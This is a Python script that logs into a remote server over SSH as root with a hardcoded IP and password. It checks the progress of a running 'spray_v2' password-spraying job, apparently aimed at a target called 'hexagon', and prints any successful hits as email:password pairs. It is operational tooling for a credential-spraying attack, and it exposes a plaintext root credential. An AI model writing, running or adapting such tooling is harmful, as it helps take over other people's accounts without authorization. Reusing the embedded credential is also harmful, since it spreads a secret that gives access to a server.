"""Check VPS spray progress."""
import paramiko

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect('64.177.83.195', username='root', password='Nm9.#p)WzifT.fo2', timeout=20)
print("[+] Connected to VPS")

def run(c, cmd, timeout=15):
    _, s, _ = c.exec_command(cmd, timeout=timeout)
    return s.read().decode().strip()

# Check process
proc = run(client, 'pgrep -af spray_v2')
print(f"[*] Process: {proc}")

# Get log tail
log = run(client, 'tail -50 /tmp/spray_v2_out.log')
print(f"[*] Log tail:\n{log}")

# Check results
res = run(client, 'cat /tmp/hexagon_spray_results.json 2>/dev/null')
if res:
    import json
    try:
        data = json.loads(res)
        print(f"\n[*] Results: tried={data.get('tried')} hits={len(data.get('hits',[]))} rl={data.get('rate_limits')} errors={data.get('errors')}")
        if data.get('hits'):
            print("[!!!] HITS:")
            for h in data['hits']:
                print(f"  {h['email']}:{h['password']}")
    except:
        print(f"[*] Results (raw): {res[:500]}")

client.close()
